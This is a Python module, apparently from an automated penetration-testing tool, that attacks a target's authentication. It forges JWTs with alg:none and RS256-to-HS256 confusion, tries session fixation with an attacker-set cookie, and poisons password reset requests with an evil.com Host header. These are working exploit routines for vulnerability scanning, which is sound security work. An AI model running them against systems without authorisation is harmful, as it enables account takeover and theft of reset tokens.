"""Skill: test_auth_deep — JWT attacks, session fixation, token analysis."""
from __future__ import annotations
import asyncio
import base64
import json
import logging
from typing import Any
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

JWT_ALG_NONE_HEADERS = _load_ds("test_auth_deep", "jwt_alg_none_headers")  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json

RESET_PATHS = _load_ds("test_auth_deep", "reset_paths")  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json


def _b64_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def _forge_alg_none(token: str, new_header: dict[str, str]) -> str:
    """Create a forged JWT with alg:none."""
    parts = token.split(".")
    if len(parts) < 2:
        return ""
    payload_part = parts[1]
    header_b64 = _b64_encode(json.dumps(new_header).encode())
    return f"{header_b64}.{payload_part}."


async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Deep authentication testing: JWT confusion, session fixation, reset poisoning.

    Returns:
        {"vulnerable": bool, "findings": [...], "tested": int}
    """
    from vxis.interaction.hands import SessionManager

    target = target_url.rstrip("/")
    findings: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    _mgr = SessionManager()
    _session = await _mgr.get_session(target)

    # --- JWT alg:none attack ---
    if token and "." in token:
        parts = token.split(".")
        if len(parts) >= 2:
            try:
                decoded_header = json.loads(_b64_decode(parts[0]))
                decoded_payload = json.loads(_b64_decode(parts[1]))
                logger.info("JWT header: %s", decoded_header)
            except Exception:
                decoded_header = {}
                decoded_payload = {}

            for alg_header in JWT_ALG_NONE_HEADERS:
                tested += 1
                forged = _forge_alg_none(token, alg_header)
                if not forged:
                    continue
                async with sem:
                    try:
                        r = await _session.request(
                            "GET",
                            f"{target}/api/users/me",
                            headers={"Authorization": f"Bearer {forged}"},
                        )
                        if r.status == 200:
                            findings.append({
                                "type": "jwt_alg_none",
                                "payload": f"alg={alg_header['alg']}",
                                "evidence": f"Server accepted alg:none token (status {r.status})",
                                "response_preview": r.text[:300],
                                "severity": "critical",
                            })
                    except Exception:
                        pass

            # --- RS256 -> HS256 confusion ---
            if decoded_header.get("alg", "").startswith("RS"):
                tested += 1
                confused = dict(decoded_header)
                confused["alg"] = "HS256"
                header_b64 = _b64_encode(json.dumps(confused).encode())
                forged_hs = f"{header_b64}.{parts[1]}.fakesig"
                async with sem:
                    try:
                        r = await _session.request(
                            "GET",
                            f"{target}/api/users/me",
                            headers={"Authorization": f"Bearer {forged_hs}"},
                        )
                        if r.status == 200:
                            findings.append({
                                "type": "jwt_alg_confusion",
                                "payload": "RS256->HS256",
                                "evidence": "Server accepted algorithm-confused token",
                                "response_preview": r.text[:300],
                                "severity": "critical",
                            })
                    except Exception:
                        pass

    # --- Session fixation ---
    tested += 1
    async with sem:
        try:
            r = await _session.request(
                "GET", "/", headers={"Cookie": "session=attacker_fixed_session"}
            )
            set_cookie = r.headers.get("set-cookie", "")
            if "attacker_fixed_session" in set_cookie or "session=attacker_fixed_session" in set_cookie:
                findings.append({
                    "type": "session_fixation",
                    "payload": "session=attacker_fixed_session",
                    "evidence": "Server accepted attacker-supplied session ID",
                    "severity": "high",
                })
        except Exception:
            pass

    # --- Password reset host poisoning ---
    async def test_reset(path: str) -> None:
        nonlocal tested
        async with sem:
            tested += 1
            try:
                r = await _session.request(
                    "POST",
                    f"{target}{path}",
                    json_data={"email": "test@example.com"},
                    headers={"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
                )
                if r.status in (200, 201, 202):
                    body = r.text.lower()
                    if "evil.com" in body or "reset" in body:
                        findings.append({
                            "type": "password_reset_poisoning",
                            "payload": f"Host: evil.com on {path}",
                            "evidence": f"Reset endpoint responded to poisoned host (status {r.status})",
                            "response_preview": r.text[:300],
                            "severity": "high",
                        })
            except Exception:
                pass

    await asyncio.gather(*[test_reset(p) for p in RESET_PATHS])

    return {"vulnerable": len(findings) > 0, "findings": findings, "tested": tested}
